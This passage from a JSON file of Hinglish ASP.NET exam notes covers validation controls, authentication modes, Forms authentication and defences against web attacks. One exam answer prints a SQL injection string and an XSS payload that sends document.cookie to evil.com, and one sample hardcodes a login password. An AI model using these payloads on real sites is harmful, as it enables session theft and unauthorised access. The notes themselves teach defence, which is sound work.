        "answer": "Validation controls user input ko page submit hone se pehle check karte hain aur error message dikhate hain.\n\n**1. RequiredFieldValidator** — field khaali na ho:\n```html\n<asp:TextBox ID=\"txtName\" runat=\"server\" />\n<asp:RequiredFieldValidator ID=\"rfv\" runat=\"server\"\n     ControlToValidate=\"txtName\" ErrorMessage=\"Name required\" Text=\"*\" />\n```\n\n**2. RangeValidator** — value min aur max ke beech:\n```html\n<asp:RangeValidator ID=\"rv\" runat=\"server\" ControlToValidate=\"txtAge\"\n     Type=\"Integer\" MinimumValue=\"18\" MaximumValue=\"60\"\n     ErrorMessage=\"Age 18-60\" />\n```\n\n**3. CompareValidator** — do value compare:\n```html\n<asp:CompareValidator ID=\"cv\" runat=\"server\"\n     ControlToValidate=\"txtConfirm\" ControlToCompare=\"txtPass\"\n     Operator=\"Equal\" ErrorMessage=\"Passwords must match\" />\n```\n\n**4. RegularExpressionValidator** — pattern (email, pincode):\n```html\n<asp:RegularExpressionValidator ID=\"rev\" runat=\"server\"\n     ControlToValidate=\"txtEmail\"\n     ValidationExpression=\"^[\\w.+-]+@[\\w-]+\\.[\\w.]+$\"\n     ErrorMessage=\"Invalid email\" />\n```\n\n**5. CustomValidator** — apna logic (client + server function).\n\n**6. ValidationSummary** — saare errors ek jagah list/popup mein.\n\n**Common properties:** `ControlToValidate`, `ErrorMessage`, `Text`, `Display`, `ForeColor`, `ValidationGroup`, `SetFocusOnError`, `EnableClientScript`.\n\n**Working:** client-side JavaScript turant feedback deta hai; server par `Page.IsValid` se dobara check — kyunki JS bypass ho sakta hai.\n\n**Diagram:** Refer to the Validation Controls Flow diagram."
      },
      {
        "question": "Differentiate between RequiredFieldValidator, RangeValidator and CompareValidator.",
        "answer": "Teeno input check karte hain, par condition alag.\n\n| Point | RequiredFieldValidator | RangeValidator | CompareValidator |\n|---|---|---|---|\n| Check | field khaali na ho | min aur max ke beech | do value compare |\n| Properties | ControlToValidate, InitialValue | MinimumValue, MaximumValue, Type | ControlToCompare or ValueToCompare, Operator, Type |\n| Type property | nahi | haan (Integer, Double, Date, Currency, String) | haan |\n| Operator | nahi | nahi | Equal, NotEqual, Greater/Less, DataTypeCheck |\n| Khaali field | **error** | pass | pass |\n| Example | name/email zaroori | age 18–60 | password = confirm |\n| Common use | mandatory fields | marks 0–100, date range | password, amount compare |\n\n**Examples:**\n```html\n<asp:RequiredFieldValidator ID=\"rfv\" runat=\"server\"\n   ControlToValidate=\"txtName\" ErrorMessage=\"Required\" />\n\n<asp:RangeValidator ID=\"rv\" runat=\"server\"\n   ControlToValidate=\"txtAge\" Type=\"Integer\"\n   MinimumValue=\"18\" MaximumValue=\"60\" ErrorMessage=\"18-60\" />\n\n<asp:CompareValidator ID=\"cv\" runat=\"server\"\n   ControlToValidate=\"txtConfirm\" ControlToCompare=\"txtPass\"\n   Operator=\"Equal\" ErrorMessage=\"Mismatch\" />\n```\n\n**Important:** Range aur Compare khaali field ko **valid** maan lete hain — isliye mandatory field par dono validator lagao (RequiredField + Range).\n\n**Compare ka special:** `Operator=\"DataTypeCheck\"` se sirf type check hota hai (value number hona chahiye).\n\n**Diagram:** Refer to the Validation Controls Flow diagram."
      },
      {
        "question": "What is the difference between client-side and server-side validation? Why is Page.IsValid necessary?",
        "answer": "ASP.NET validation dono jagah hoti hai.\n\n| Point | Client-side | Server-side |\n|---|---|---|\n| Kahan chalti | browser (JavaScript) | web server |\n| Response | turant, bina round trip | page submit ke baad |\n| Rok sakta | haan (submit nahi hota) | haan (event handler return) |\n| Bypass | haan — JS off, dev tools, direct POST | nahi |\n| Load | client par | server par |\n| Security | **nahi** | **haan** |\n\n**Client-side:** `EnableClientScript=\"true\"` (default) par ASP.NET JavaScript generate karta hai; user ko turant error dikhta hai, bandwidth bachti hai.\n\n**Server-side:** har validator ka server check hamesha chalta hai; `Page.IsValid` batata hai sab valid hain ya nahi:\n```csharp\nprotected void btnSave_Click(object sender, EventArgs e)\n{\n    if (!Page.IsValid) { return; }\n    // safe: save record\n}\n```\n\n**Page.IsValid kyun zaroori:**\n- Attacker browser ki JS band kar sakta hai ya request manually bhej sakta hai — client validation bypass.\n- Isliye data save karne se pehle server par `Page.IsValid` check karo, warna invalid/kharaab data DB mein chala jaayega.\n\n**Extras:**\n- `ValidationSummary` se saare errors ek jagah (summary/popup).\n- `ValidationGroup` se sirf ek button ke validators validate.\n- `CausesValidation=\"false\"` cancel button par — warna wo bhi atak jaayega.\n- Validation ke baad business rules (login, duplicate check) code-behind mein.\n\n**Diagram:** Refer to the Validation Controls Flow diagram."
      }
    ]
  },
  {
    "id": "security-concepts",
    "number": "4.14",
    "title": "Basic Security Concepts in ASP.NET",
    "subtitle": "Authentication, authorisation, forms authentication aur attacks",
    "icon": "shield",
    "accent": "#00bcd4",
    "englishDefinition": "Security in ASP.NET rests on authentication (proving who the user is) and authorisation (deciding what that user may do), backed by the classic goals of confidentiality, integrity and availability. ASP.NET Web Forms offers four authentication modes set in Web.config under <authentication mode='...'>: Windows (IIS/AD credentials, good for intranets), Forms (the application shows its own login page, sets an encrypted authentication ticket cookie, and is the usual choice for internet sites), Passport/Microsoft account (deprecated), and None. Forms authentication uses the <forms loginUrl, timeout, protection> element plus <authorization> rules that deny anonymous users, FormsAuthentication.RedirectFromLoginPage to issue the ticket, User.Identity.IsAuthenticated to check it, and FormsAuthentication.SignOut to log out; roles add authorisation granularity. ASP.NET also provides membership and role providers, URL authorisation, machine-key protection of view state, request validation, and built-in defences against the OWASP risks - SQL injection (parameterised queries), cross-site scripting (HtmlEncode, ValidateRequest), cross-site request forgery (view-state user key, anti-forgery tokens), session hijacking (SSL, HttpOnly/Secure cookies) and information disclosure (custom errors, no stack traces).",
    "intro": "Security ke do shabd sabse pehle: **Authentication** (tum kaun ho?) aur **Authorization** (tum kya kar sakte ho?). ASP.NET mein authentication ke modes hain — **Windows** (intranet), **Forms** (internet, apna login page), **Passport** (Microsoft account, purana) aur **None**. Uske baad attacks se bachav: **SQL injection, XSS, CSRF**, session hijacking, aur 'information disclosure' — har ek ka ek seedha ilaaj hai. Exam mein authentication vs authorization aur forms authentication ka config — ye pakka aata hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Security ke basic concepts",
        "kicker": "Definition",
        "body": "**Authentication** = user ki identity verify karna (login). **Authorization** = us user ko kis resource ka access dena hai (role/permission). Ye do alag steps hain — pehle 'kaun ho' phir 'kya kar sakte ho'.",
        "body2": "Security ke teen classic goals (**CIA**): **Confidentiality** (data sirf haqdaar ko dikhe — encryption/HTTPS), **Integrity** (data bina permission na badle — hashing/MAC), **Availability** (service chalti rahe — DoS se bachav). Web app mein inke saath **non-repudiation** (audit log) bhi matter karta hai.",
        "chips": [
          "Authentication",
          "Authorization",
          "Confidentiality",
          "Integrity",
          "Availability"
        ]
      },
      {
        "type": "cards",
        "title": "ASP.NET authentication modes",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "user",
            "title": "Windows",
            "body": "IIS/Windows credentials se login — intranet ke liye best, alag login form nahi chahiye."
          },
          {
            "icon": "lock",
            "title": "Forms",
            "body": "Apna login page + encrypted auth ticket cookie — internet sites ke liye sabse common."
          },
          {
            "icon": "globe",
            "title": "Passport",
            "body": "Microsoft/Live ID se login (purana, deprecated) — ek hi login kai sites par."
          },
          {
            "icon": "eye",
            "title": "None",
            "body": "Koi ASP.NET authentication nahi — anonymous access, custom logic ya static site ke liye."
          },
          {
            "icon": "shield",
            "title": "Authorization rules",
            "body": "`<authorization><deny users='?' /><allow users='*' /></authorization>` — kaun kaun se path access kar sakta hai."
          },
          {
            "icon": "check",
            "title": "Roles / Membership",
            "body": "Provider based users + roles; `[Authorize]` jaisa control; role ke hisaab se menu/buttons."
          }
        ]
      },
      {
        "type": "comparison",
        "title": "Authentication vs Authorization",
        "kicker": "Comparison",
        "columns": [
          "Authentication",
          "Authorization"
        ],
        "rows": [
          {
            "label": "Sawaal",
            "values": [
              "tum kaun ho?",
              "tum kya kar sakte ho?"
            ]
          },
          {
            "label": "Kab",
            "values": [
              "pehle",
              "authentication ke baad"
            ]
          },
          {
            "label": "Kaise",
            "values": [
              "username+password, Windows, OAuth",
              "roles, permission, rules"
            ]
          },
          {
            "label": "ASP.NET mein",
            "values": [
              "<authentication mode=...>",
              "<authorization> rules, IsInRole"
            ]
          },
          {
            "label": "Fail par",
            "values": [
              "login page / 401",
              "403 access denied"
            ]
          },
          {
            "label": "Example",
            "values": [
              "Riya login karti hai",
              "Riya sirf apne marks dekh sakti hai"
            ]
          }
        ],
        "columnColors": [
          "#00bcd4",
          "#00e676"
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Forms authentication — config + login page",
        "code": "<!-- Web.config -->\n<system.web>\n  <authentication mode=\"Forms\">\n    <forms loginUrl=\"Login.aspx\" timeout=\"30\" protection=\"All\" />\n  </authentication>\n  <authorization>\n    <deny users=\"?\" />      <!-- anonymous band -->\n  </authorization>\n</system.web>\n\n<!-- Login.aspx.cs -->\nprotected void btnLogin_Click(object sender, EventArgs e)\n{\n    if (!Page.IsValid) { return; }\n\n    // real project mein: DB check + hashed password\n    if (txtUser.Text == \"riya\" && txtPass.Text == \"Pass@123\")\n    {\n        FormsAuthentication.RedirectFromLoginPage(\n            txtUser.Text, chkRemember.Checked);\n\n        // ye 3 kaam karta hai:\n        // 1. auth ticket (encrypted cookie) banata hai\n        // 2. user ko requested page par bhejta hai\n        // 3. warna Default.aspx\n    }\n    else\n    {\n        lblMsg.Text = \"Invalid username or password\";\n    }\n}\n\n// Logout\nprotected void btnLogout_Click(object sender, EventArgs e)\n{\n    FormsAuthentication.SignOut();\n    Response.Redirect(\"Login.aspx\");\n}",
        "language": "csharp",
        "filename": "Web.config + Login.aspx.cs",
        "php": "Bina login:  Default.aspx  ->  Login.aspx?ReturnUrl=%2fDefault.aspx\n\nLogin ke baad:  Default.aspx   (cookie .ASPXAUTH set)\n\nUser.Identity.Name        ->  riya\nUser.Identity.IsAuthenticated -> True\n\nLogout ke baad:  Login.aspx",
        "label": "Rendered output",
        "height": 250,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "`<deny users=\"?\" />` ka matlab: anonymous (?) users block; login ke baad auth cookie se access milta hai."
      },
      {
        "type": "points",
        "title": "Common attacks aur bachav",
        "kicker": "Attacks",
        "points": [
          "**SQL injection:** parameterised queries / stored procedures; input validate karo; DB user ko least privilege do.",
          "**XSS (cross-site scripting):** output par `Server.HtmlEncode` / `HttpUtility.HtmlEncode`; `ValidateRequest='true'` (default) input block karta hai.",
          "**CSRF:** `ViewStateUserKey` set karo, anti-forgery token, sensitive POST par re-authentication; `SameSite` cookies.",
          "**Session hijacking:** HTTPS (SSL) use karo, cookie par `HttpOnly` + `Secure`, login ke baad `Session.Abandon()` se naya SessionID.",
          "**Information disclosure:** `customErrors mode='On'` prod mein, stack trace/connection string user ko na dikhe.",
          "**Brute force:** account lockout (Membership), captcha, rate limiting, strong password policy.",
          "**Password storage:** plain text kabhi nahi — salted hash (PBKDF2/bcrypt) use karo; Forms auth ka `protection='All'` view state + ticket encrypt karta hai."
        ]
      },
      {
        "type": "diagram",
        "title": "ASP.NET Security — Authentication & Authorization",
        "kicker": "Diagram",
        "diagram": "wt4-security",
        "caption": "Request → authentication (kaun?) → authorization (kya?) → page / 401 / 403"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Authentication** = identity verify; **Authorization** = permission check.",
          "**Modes:** Windows (intranet), Forms (internet, default choice), Passport (deprecated), None.",
          "**Forms auth:** `<authentication mode='Forms'>` + `<deny users='?'/>` + `RedirectFromLoginPage`, `SignOut`.",
          "**CIA:** confidentiality (encryption/HTTPS), integrity (hash/MAC), availability.",
          "**Attacks:** injection → parameters; XSS → encode; CSRF → tokens/ViewStateUserKey; hijack → HTTPS + HttpOnly.",
          "**Prod:** customErrors on, least privilege, hashed passwords, audit logs."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the basic security concepts in ASP.NET with authentication and authorization.",
        "answer": "ASP.NET security do staron mein kaam karti hai — pehle identity, phir permission.\n\n**1. Authentication (kaun ho?)**\nUser ki identity verify karna. Modes `Web.config` mein:\n```xml\n<authentication mode=\"Forms\">   <!-- Windows | Forms | Passport | None -->\n```\n- **Windows:** IIS/Windows credentials (intranet, domain users).\n- **Forms:** apna login page + encrypted ticket cookie (internet sites ka standard).\n- **Passport:** Microsoft account (deprecated).\n- **None:** koi ASP.NET auth nahi (anonymous/custom).\n\n**2. Authorization (kya kar sakte ho?)**\n```xml\n<authorization>\n  <deny users=\"?\" />          <!-- anonymous block -->\n  <allow users=\"riya\" roles=\"Admin\" />\n</authorization>\n```\nCode mein: `User.Identity.IsAuthenticated`, `User.IsInRole(\"Admin\")`.\n\n**3. Security goals (CIA)**\n- **Confidentiality** — data sirf haqdaar ko (HTTPS, encryption).\n- **Integrity** — data bina permission na badle (hash, MAC, view state MAC).\n- **Availability** — service up rahe (DoS se bachav, backup).\n\n**4. Threats aur bachav**\n| Attack | Bachav |\n|---|---|\n| SQL injection | parameterised query |\n| XSS | HtmlEncode, ValidateRequest |\n| CSRF | tokens, ViewStateUserKey |\n| Session hijack | HTTPS, HttpOnly/Secure cookie |\n| Info disclosure | customErrors on |\n\n**5. Extra:** membership/role providers, machine key, audit logging, least privilege.\n\n**Diagram:** Refer to the ASP.NET Security — Authentication & Authorization diagram."
      },
      {
        "question": "Explain Forms authentication in ASP.NET with configuration and code.",
        "answer": "**Forms authentication** mein application apna login page dikhati hai aur successful login par ek **encrypted auth ticket cookie** (`.ASPXAUTH`) set karti hai.\n\n**1. Web.config:**\n```xml\n<system.web>\n  <authentication mode=\"Forms\">\n    <forms loginUrl=\"Login.aspx\" timeout=\"30\" protection=\"All\" />\n  </authentication>\n  <authorization>\n    <deny users=\"?\" />       <!-- anonymous users block -->\n  </authorization>\n</system.web>\n```\n\n**2. Login page (code-behind):**\n```csharp\nprotected void btnLogin_Click(object sender, EventArgs e)\n{\n    if (!Page.IsValid) return;\n\n    if (CheckUser(txtUser.Text, txtPass.Text))     // DB + hashed password\n    {\n        FormsAuthentication.RedirectFromLoginPage(\n            txtUser.Text, chkRemember.Checked);\n    }\n    else\n    {\n        lblMsg.Text = \"Invalid username or password\";\n    }\n}\n```\n\n**3. Kaise kaam karta hai:**\n- `RedirectFromLoginPage` encrypted ticket (username + expiry) cookie mein daalta hai.\n- Har request par ASP.NET cookie padh kar `User.Identity` set karta hai.\n- Bina login access karne par `Login.aspx?ReturnUrl=...` par bhej deta hai.\n\n**4. Checking aur logout:**\n```csharp\nif (!User.Identity.IsAuthenticated)\n    Response.Redirect(\"Login.aspx\");\n\nFormsAuthentication.SignOut();      // logout\n```\n\n**5. Roles:** `FormsAuthenticationTicket` + `RoleManager`, ya `Global.asax` ke `Application_AuthenticateRequest` mein `GenericPrincipal` (roles ke saath).\n\n**6. Security:** hashed passwords (bcrypt/PBKDF2), HTTPS, `protection=\"All\"` (encrypt + validate), login ke baad `Session.Abandon()`.\n\n**Diagram:** Refer to the ASP.NET Security — Authentication & Authorization diagram."
      },
      {
        "question": "Explain SQL injection, XSS and CSRF with prevention techniques in ASP.NET.",
        "answer": "Teen sabse common web attacks — har ek ka seedha bachav hai.\n\n**1. SQL injection** — input ke andar SQL daal kar query badalna.\n- Vulnerable: `\"SELECT * FROM Users WHERE Name='\" + txtUser.Text + \"'\"`\n- Attack: `' OR '1'='1`\n- **Bachav:** parameterised query / stored procedure — `cmd.CommandText = \"SELECT * FROM Users WHERE Name=@n\"; cmd.Parameters.AddWithValue(\"@n\", txtUser.Text);`\n- Plus: input validation, least-privilege DB user, error messages chhupao.\n\n**2. XSS (cross-site scripting)** — user ke input mein JavaScript daal kar doosre users ke browser mein chalana.\n- Attack: comment mein `<script>document.location='evil.com?c='+document.cookie</script>`\n- **Bachav:** output encode (`Server.HtmlEncode`), input validation, `ValidateRequest=\"true\"` (default), `HttpOnly` cookie (JS cookie na padh sake), CSP header.\n\n**3. CSRF (cross-site request forgery)** — logged-in user ke browser se attacker ki site ke through galat request bhejna.\n- **Bachav:** anti-forgery token (per-user, per-session), `ViewStateUserKey = Session.SessionID`, POST ke saath token verify, `SameSite` cookies, sensitive action par re-authenticate.\n\n**General security checklist:**\n- HTTPS everywhere (`requireSSL=\"true\"`), secure + HttpOnly cookies.\n- `customErrors mode=\"On\"` production mein (stack trace na dikhe).\n- Least privilege, audit logs, session timeout.\n- Software/framework updates (patched .NET, IIS).\n\n**Diagram:** Refer to the ASP.NET Security — Authentication & Authorization diagram."
      }
    ]
  },
];
